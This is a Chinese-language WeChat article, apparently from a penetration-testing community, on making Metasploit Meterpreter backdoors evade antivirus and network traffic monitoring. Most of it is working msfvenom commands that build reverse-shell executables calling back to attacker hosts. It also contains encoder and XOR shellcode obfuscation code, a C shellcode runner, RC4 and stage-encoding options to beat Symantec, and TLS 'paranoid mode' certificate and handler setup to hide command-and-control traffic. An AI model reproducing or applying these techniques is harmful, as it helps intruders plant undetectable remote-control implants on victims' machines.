<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dimh2gfVpL2v4F-W5xJ1OA)

> > 在实战中，即便你绕过了杀毒软件的检测，也很有可能会结束在某些流量监控的设备上。MSF 可以说其是每一个内网玩家的必用工具。理所当然，这款工具也自然而然地被各大安全厂商分析，捕捉其在命令执行时产生的数据和流量。当我们使用一个没有做过加密处理的原版工具时，内网中的安全设备会根据我们的流量特征进行判断，认定我们为恶意进程，从而导致控制中断。

Meterpreter 技巧
--------------

### 生成后门

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.200 lport=4444 -f exe > /root/Desktop/Green_m.exe
```

这样可以生成一个使用 tcp 协议反向连接到 192.168.1.200 的 4444 端口的 meterpreter 的后门。

这样生成的 exe 可以运行，但是会被杀掉。

### 生成 shellcode 免杀

手动编译 meterpreter 并对 shellcode 进行编码就能绕过静态查杀，meterpreter 本身就是直接加载进内存并且有编码，绕过动态查杀基本没问题

```
msfvenom -p windows/meterpreter/reverse_tcp-e x86/shikata_ga_nai -i 5 -b ‘\x00’lhost=192.168.1.200 lport=4444 -f c
```

上述命令生成在之前的基础上生成基于 c 语言格式的 shellcode，通过 e 参数指定编码方式，i 参数指定编码次数，b 参数去除指定代码，一般是空代码或者错误代码，-f 指定生成格式。

```
unsigned char buf[] ="shellcode is here";main(){( (void(*)(void))&buf)();}
```

这种方式 vc++6.0 能够成功编译

### 选择 payload 进行免杀

上面生成 shellcode 的方式是针对杀软静态免杀的，接下来说到动态行为免杀。

在对市面上主流的杀软进行测试的过程中，发现 symantec 会在 meterpreter 回连成功，从 metasploit 里接受数据的时候报毒。

无论是自己手动编码编译还是 msf 自动生成的 exe 都会这样被报毒。

使用 reverse_https 等 payload 可以 anti symantec。

```
msfvenom -p windows/meterpreter/reverse_httpslhost=192.168.1.200 lport=443 -f c
```

但是需要在 metasploit 设置：

```
set EnableStageEncoding true

set stageencoder x86/fnstenv_mov

set stageencodingfallback false
```

将控制端向被控制端发送的 stage 进行编码，从而绕过 symantec 的查杀。

同样，使用 reverse_tcp_rc4 也有同样的效果，而且不用设置 stageencoder 选项，更稳定更方便。

```
msfvenom -p windows/meterpreter/reverse_tcp_rc4lhost=192.168.1.200 lport=4444 RC4PASSWORD=Green-m-f c
```

利用 rc4 对传输的数据进行加密，密钥在生成时指定，在监听的服务端设置相同的密钥。就可以在 symantec 眼皮底下执行 meterpreter。

Meterpreter 免杀及对抗分析
-------------------

### 静态检测与对抗

#### 静态分析原理

简单的来说，就是通过特征码识别静态文件，杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。

恶意软件匹配规则 yara 匹配恶意软件的时候就是用的这样的方式。通过特征来识别抓 HASH 工具 QuarksPwDump，yara 规则如下

```
/*  This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.*/rule QuarksPwDump_Gen : Toolkit {meta:description = "Detects all QuarksPWDump versions"author = "Florian Roth"date = "2015-09-29"score = 80hash1 = "2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa"hash2 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"hash3 = "a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9"hash4 = "c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab"hash5 = "677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa"hash6 = "d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674"hash7 = "8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819"strings:$s1 = "OpenProcessToken() error: 0x%08X" fullword ascii$s2 = "%d dumped" fullword ascii$s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii$s4 = "\\SAM-%u.dmp" fullword asciicondition:all of them}
```

可以看到匹配匹配 s2 s4 全部四条规则及标记为识别。

当然还有通过 md5、sha1 来计算文件 hash 识别恶意软件，最简单粗暴而且有效，但是也很容易绕过，也有分段进行 hash 来识别相似度的方法，原理和上面的特征码识别都是一样的，这里不再赘述。

#### 对抗静态分析

1. 修改特征码 特征码的识别也有一些不同的方式，最开始是使用单个特征码来定位，就有了与之对抗的 ccl，随着对抗技术的升级，就有了多条的特征码，对应的也就有了 mutilccl, myccl, virtest，甚至现在 github 上的自动化特征码识别，技术越来越多样。

修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。

虽然 meterpreter 对于我们来说是开源的，但是偶尔编译出来的文件修改一些小地方就能让杀软直接报废，也算是一个保留方法了。

2. 加壳 加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征。在某些比较流氓的国产杀软的检测方式下，主流的壳如 VMP, Themida 等，一旦被检测到加壳直接弹框告诉你这玩意儿有问题，虽然很直接，但是还是挺有效的。有些情况下，有的常见版本的壳会被直接脱掉分析。

面对这种情况可以考虑用一切冷门的加密壳，有时间精力的可以基于开源的压缩壳改一些源码，效果可能会很不错。

总得来说，加壳的方式来免杀还是比较实用的，特别是对于不开源的 PE 文件，通过加壳可以绕过很多特征码识别。

3.shellcode 编译 msfvenom 不仅提供多种格式的 payload，其中就包括 shellcode。shellcode 对于源码免杀来说基本上是最好用的那种，绕过静态杀软的神器。

使用 msfvenom 选择 encoder 的时候大家一般都会选择 shikata_ga_nai 这个编码方式（因为 x86 的 encoder 里只有它的 Rank 是 excellent），这个 encoder 的解码和编码过程都是随机生成的。

但是，这个编码内容是有特征的，经过 shikata_ga_nai 编码之后的 shellcode 必定含有 \ xd9\x74\x24\xf4 这串 16 进制字符

当然不止是 shikata_ga_na 编码方式，其他的编码方式特征可能更加明显（x86/fnstenv_mov 的编码方式就被很多杀软能直接检测到，远不如 shikata_ga_na ）。那么如果要对抗这样的情况，只能自己再将编码过后的 shellcode 进行编码或者加密。

这里写一个简单的 xor 作为 demo 供大家感受一下，代码如下：

```
unsigned char shellcode[]="\x33\xc9\xb1\xc6\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe6";// the key to xorunsigned char key[]="\xcc\0xfa\0x1f\0x3d";// encode shellcode     for ( i=0; i<(sizeof(shellcode)-1) ; i=i+1)     {          shellcode[i]=shellcode[i]^key[i % sizeof(key)];     }// decodervoid decode(){for (i=0; i<(sizeof(shellcode)-1); i+=1)     shellcode[i]=shellcode[i]^key[i%sizeof(key)];}void executeShellcode(){     decode();     // run shellcode}
```

流量检测与对抗
-------

### Meterpreter 的传输加载

要知道 meterpreter 的流量特征，首先要搞清楚 meterpreter 的传输方式。

metasploit 的木马分为两个大类，staged 和 stageless 。

staged 类型的木马的运行流程为：

> 客户端在从服务器端接收 stager 后，stager 由引导代码 loader 和 payload 组成，客户端在内存中分配一段地址将 payload 暂存起来，再通过 loader 来加载内存中的 payload。这种内存中注入 PE 文件的方式称为反射型 DLL 注入。

> stageless 的则是将完整的 payload 都编译在木马中，相对与 staged 的木马来说，前者体积庞大不灵活，而且容易被杀。

我们以 windows/meterpreter/reverse_tcp 为例，下面是部分源码（完整源码）

```
# Generate and compile the stager#def generate_reverse_tcp(opts={})combined_asm = %Q^    cld                    ; Clear the direction flag.    call start             ; Call start, this pushes the address of 'api_call' onto the stack.    #{asm_block_api}  ; To find some functions address such as VirutalAlloc()    start:    pop ebp    #{asm_reverse_tcp(opts)} ; Send and recvice socket connection    #{asm_block_recv(opts)} ; Do some stuff after recvied payload^Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_stringend
```

`asm_block_api`部分是用来定义查询 API 调用地址的函数。

`asm_reverse_tcp` 部分是用来发送 socket 请求的。

`asm_block_recv` 部分是建立连接后，接收服务端发送的 stager，再通过 VirtualAlloc() 分配 RWX 权限的内存，然后执行后续。

这部分建客户端发起连接的过程其实是没有什么特征的，特征主要是在服务端发送的 stager，接下来让我们详细看看发送的 stager 里是什么。

为了让客户端运行服务端发送的 meterpreter payload，需要先发送一个加载 meterpreter_loader

这段代码主要作用是加载反射性注入的引导代码 ReflectiveLoader，通过 ReflectiveLoader 来加载 meterpreter 及相关配置。

上面分析这段 meterpreter_loader 是固定的一段汇编代码，通过 nasm 将该部分汇编代码转化为机器码如下：

`4d5ae8000000005b52455589e581c364130000ffd381c395a40200893b536a0450ffd0`

该 16 进制字符串即为 meterpreter 的特征。

### 对抗流量检测

既然流量是有特征的，那么有没有办法对流量进行加密呢，答案是肯定的，在某些环境下，我们需要用到 meterpreter 的偏执模式 (paranoid mode)。

偏执模式在面对接受的请求很多的时候，可以有效过滤筛选回连的请求，只留下自己所需要的。

同时，因为其使用了 SSL/TLS 认证，因此在应对流量监控和分析时，有很不错的效果，当然也能够 Bypass av(by data stream)。

#### 创建一个 SSL/TLS 证书

在 kali 或者其他带有 openssl 的环境下：

```
$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=green-m.github.io" \    -keyout green-m.github.io.key \    -out green-m.github.io.crt && \cat green-m.github.io.key  green-m.github.io.crt > green-m.github.io.pem && \rm -f green-m.github.io.key  green-m.github.io.crt
```

你可以把 green-m.github.io 这个 URL 改成任意你想回连的地址，直接指定相应 IP 也可以。

如果能搞到一个受信任的证书颁发机构签名的 SSL/TLS 证书，那就流量直接畅通无阻。![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBQpibZIj40TgE32k3Pibkk8THSo6E3Jfw8Rt6dHBR8CiappuxkZibuoBEy3gskmBwiblbURkfic4Ay3dQdw/640?wx_fmt=png)

#### 生成偏执模式的 payload

```
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=green-m.github.io LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./green-m.github.io.pem StagerVerifySSLCert=true PayloadUUIDName=Green_m -f exe -o ./Green_m.exe
```

通过设置 PayloadUUIDTracking 和 PayloadUUIDName 可以在监听的时候过滤掉不需要的回连请求。为了 Bypass av 的需求，你还可以生成 shellcode 来自己编译。

如果网络环境不好，你还可以使用 stageless 的 payload，-p 参数指定 windows/meterpreter_reverse_https，其他不用修改。

#### 监听偏执模式

```
msfconsoleuse exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_winhttpsset LHOST green-m.github.ioset LPORT 443set HandlerSSLCert ./green-m.github.io.pemset IgnoreUnknownPayloads trueset StagerVerifySSLCert trueset exitonsession falserun -j -z
```

设置 HandlerSSLCert 和 StagerVerifySSLCert 参数来使用 TLS pinning，IgnoreUnknownPayloads 接受白名单的 payload。

end

  

往期精彩文章

  

  

  

  

[内网渗透之内网主机发现技巧](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247496128&idx=1&sn=00d961e09dd19a8b304792c6534d4867&chksm=f9e3e751ce946e471a7d3c2c14d80a76129172bf64be65aa8d9f77763869212fb5b2fc9d3665&scene=21#wechat_redirect)  

[长安 “战疫” 网络安全卫士守护赛 writeup WHT 战队 WRITEUP](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247496105&idx=1&sn=921c3f553e866b083ae33bc5255454d9&chksm=f9e3e738ce946e2ef739ce25a3c3c80247abbcaaf036b6b3f1286505eec5a9b377f5dd12757d&scene=21#wechat_redirect)  

[第二届 “BMZCTF” 网络安全公开赛官方解题思路](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247496071&idx=1&sn=ac9cb47d356bcdd6400be465c4d0c1d8&chksm=f9e3e716ce946e0048af6c6a5385814d3012edd8e9260a18d4f0a82b701519861430da919311&scene=21#wechat_redirect)  

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/HQn53QYo2G6qibBGYUpMN61OzcccFkm56YqORO7w7y37jvy8e6Mj2DbBzkoIee5HNFnDlzsek47QJmmCgRMTwYw/640?wx_fmt=jpeg)

_技术支持：白帽子社区团队_

_—_ 扫码关注我们 _—_